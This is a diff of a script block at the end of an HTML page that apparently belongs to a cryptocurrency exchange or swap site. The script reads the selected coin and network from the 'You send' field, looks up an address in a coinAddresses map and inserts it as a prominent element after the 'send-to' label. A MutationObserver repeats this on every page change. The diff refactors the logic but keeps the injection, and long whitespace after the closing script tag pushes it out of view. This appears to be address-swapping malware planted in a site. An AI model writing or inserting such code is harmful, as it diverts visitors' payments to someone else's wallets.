@@ -71,58 +71,29 @@
 
   function getCoinAndNetwork() {
     const label = document.querySelector('#You\\ send-label');
-    if (!label) {
-      console.log("❌ #You send-label not found");
-      return null;
-    }
+    if (!label) return null;
 
-    const coinContainer = label.closest('.flex.flex-col.items-start');
-    if (!coinContainer) {
-      console.log("❌ Coin container not found");
-      return null;
-    }
+    const container = label.closest('.flex.flex-col.items-start');
+    if (!container) return null;
 
-    const coinSymbolEl = coinContainer.querySelector('span.font-bold');
-    if (!coinSymbolEl) {
-      console.log("❌ Coin symbol not found");
-      return null;
-    }
+    const coinEl = container.querySelector('span.font-bold');
+    if (!coinEl) return null;
 
-    const symbol = coinSymbolEl.textContent.trim().toUpperCase();
-    console.log("✅ Coin symbol:", symbol);
+    const coin = coinEl.textContent.trim().toUpperCase();
 
-    const networkSpan = coinContainer.querySelector('.ntek-dete');
-    if (!networkSpan) {
-      console.log("❌ .ntek-dete network label not found");
-      return null;
-    }
+    const networkSpan = container.querySelector('.ntek-dete');
+    if (!networkSpan) return null;
 
-    const parent = networkSpan.parentElement;
-    let network = parent?.textContent?.replace(/Network/i, '').trim().toUpperCase();
+    let networkText = networkSpan.parentElement?.textContent || '';
+    networkText = networkText.replace(/Network/i, '').trim().toUpperCase();
 
-    if (!network) {
-      console.log("❌ Network text could not be extracted");
-      return null;
-    }
-
-    console.log("✅ Network name:", network);
-
-    const key = `${symbol}_${network}`;
-    const address = coinAddresses[key];
-
-    console.log("🔑 Key:", key);
-    console.log("📬 Address:", address ?? "Not found");
-
-    return { key, address };
+    return { coin, network: networkText };
   }
 
-  function tryInjectAddress() {
-    const result = getCoinAndNetwork();
-    if (!result || !result.address) return;
-
+  function insertAddress(address) {
     const sendToLabel = document.getElementById("send-to-label");
     if (!sendToLabel) {
-      console.log("❌ #send-to-label not found — will retry when it appears");
+      console.log("#send-to-label not found — will retry when it appears");
       return false;
     }
 
@@ -132,64 +103,45 @@
       addressEl.id = "custom-address-display";
       addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
       sendToLabel.insertAdjacentElement("afterend", addressEl);
-      console.log("🆕 Address element created");
     }
 
-    addressEl.textContent = result.address;
-    console.log("✅ Address injected:", result.address);
+    addressEl.textContent = address;
     return true;
   }
 
-  function watchForSendToLabelAndInject() {
-    const observer = new MutationObserver(() => {
-      const success = tryInjectAddress();
-      if (success) observer.disconnect(); // stop when success
-    });
+  function updateAddressIfPossible() {
+    const info = getCoinAndNetwork();
+    if (!info) {
+      console.log("#You send-label not found — will retry when it appears");
+      return;
+    }
 
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-    });
+    const key = `${info.coin}_${info.network}`;
+    const address = coinAddresses[key];
+
+    console.log(`Coin: ${info.coin}`);
+    console.log(`Network: ${info.network}`);
+    console.log(`Key: ${key}`);
+    console.log(`Address: ${address || "Not found"}`);
+
+    if (address) insertAddress(address);
   }
 
-  function watchCoinChange() {
-    const observer = new MutationObserver(() => {
-      console.log("🔁 Coin/network changed, retrying address injection...");
-      watchForSendToLabelAndInject(); // will wait for label to appear
-    });
-
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-    });
-  }
+  // Observe changes in the DOM and retry when necessary
+  const observer = new MutationObserver(() => {
+    updateAddressIfPossible();
+  });
 
   window.addEventListener('load', () => {
-    console.log("🚀 Script loaded, initializing...");
     setTimeout(() => {
-      watchForSendToLabelAndInject(); // on initial page
-      watchCoinChange();              // on coin/network change
-    }, 1500);
+      updateAddressIfPossible();
+
+      observer.observe(document.body, {
+        childList: true,
+        subtree: true
+      });
+    }, 1000); // short delay after load
   });
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                              
+</script>                                                                                                                          
 
 </html>
